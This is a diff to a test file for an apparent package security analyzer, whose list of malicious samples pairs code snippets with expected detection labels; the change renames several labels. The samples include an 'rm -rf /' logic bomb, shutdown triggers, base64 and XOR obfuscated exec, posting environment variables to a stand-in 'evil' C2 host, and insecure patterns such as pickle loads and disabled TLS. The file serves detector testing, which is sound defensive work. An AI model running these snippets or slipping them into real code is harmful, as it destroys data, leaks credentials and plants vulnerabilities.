@@ -33,9 +33,9 @@ from taint import analyze_package
 # (name, kind, payload, expected_pattern[, mirrors])
 MALICIOUS = [
     ("probabilistic_bomb", "code", "import random, os\nif random.random() < 0.02:\n    os.system('rm -rf /')", "PROBABILISTIC_BOMB", "logic bombs"),
-    ("chained_bomb", "code", "import random, os\nk=0\nif random.randint(0,9)==3: k+=1\nif random.randint(0,9)==5: k+=1\nif k==2: os.system('shutdown')", "CHAINED_QUANTUM_BOMB", "staged trigger"),
-    ("cross_func_bomb", "code", "import random, os\ndef a(x): return random.random()<0.2\ndef b(y): return a(y) and random.random()<0.1\nif b(u): os.system('shutdown')", "CROSS_FUNCTION_QUANTUM_BOMB", "distributed logic"),
-    ("stego_chr_xor", "code", "def s(m): return ''.join(chr(ord(c)^0x2A) for c in m)\nif s(secret)==trigger: unlock_root()", "QUANTUM_STEGANOGRAPHY", "char-code stego"),
+    ("chained_bomb", "code", "import random, os\nk=0\nif random.randint(0,9)==3: k+=1\nif random.randint(0,9)==5: k+=1\nif k==2: os.system('shutdown')", "CHAINED_TRIGGER_BOMB", "staged trigger"),
+    ("cross_func_bomb", "code", "import random, os\ndef a(x): return random.random()<0.2\ndef b(y): return a(y) and random.random()<0.1\nif b(u): os.system('shutdown')", "CROSS_FUNCTION_BOMB", "distributed logic"),
+    ("stego_chr_xor", "code", "def s(m): return ''.join(chr(ord(c)^0x2A) for c in m)\nif s(secret)==trigger: unlock_root()", "ENCODED_STRING_PAYLOAD", "char-code stego"),
     ("exec_base64", "code", "import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())", "OBFUSCATED_PAYLOAD", "W4SP/apicolor"),
     ("xor_blob_exec", "code", "data=[104,105,106,107,108,109,110,111]\nexec(bytes([b^42 for b in data]).decode())", "OBFUSCATED_PAYLOAD", "telnyx WAV-XOR"),
     ("cred_exfil_direct", "code", "import os, requests\nrequests.post('https://evil/c2', data=os.environ)", "CREDENTIAL_EXFILTRATION", "TeamPCP"),
@@ -49,7 +49,7 @@ MALICIOUS = [
     ("pickle_loads", "code", "import pickle\ndef load(b): return pickle.loads(b)", "INSECURE_DESERIALIZATION", "classic"),
     ("yaml_load", "code", "import yaml\ndef c(s): return yaml.load(s)", "INSECURE_DESERIALIZATION", "classic"),
     ("eval_input", "code", "def run(): return eval(input())", "DANGEROUS_SINK", "classic"),
-    ("antidebug_sleep", "code", "import random, time\nif random.random() < 0.09:\n    time.sleep(99999)", "QUANTUM_ANTIDEBUG", "anti-analysis"),
+    ("antidebug_sleep", "code", "import random, time\nif random.random() < 0.09:\n    time.sleep(99999)", "ANTI_ANALYSIS_TIMING", "anti-analysis"),
     ("hardcoded_secret", "code", "API_KEY = 'sk-live-9f8a7b6c5d4e3f2a1b0c'", "HARDCODED_SECRET", "classic"),
     ("disabled_tls", "code", "import requests\nrequests.get(u, verify=False)", "DISABLED_CERT_VALIDATION", "classic"),
     ("weak_hash_pw", "code", "import hashlib\ndef store(pw): return hashlib.md5(pw.encode()).hexdigest()", "WEAK_HASH", "classic"),
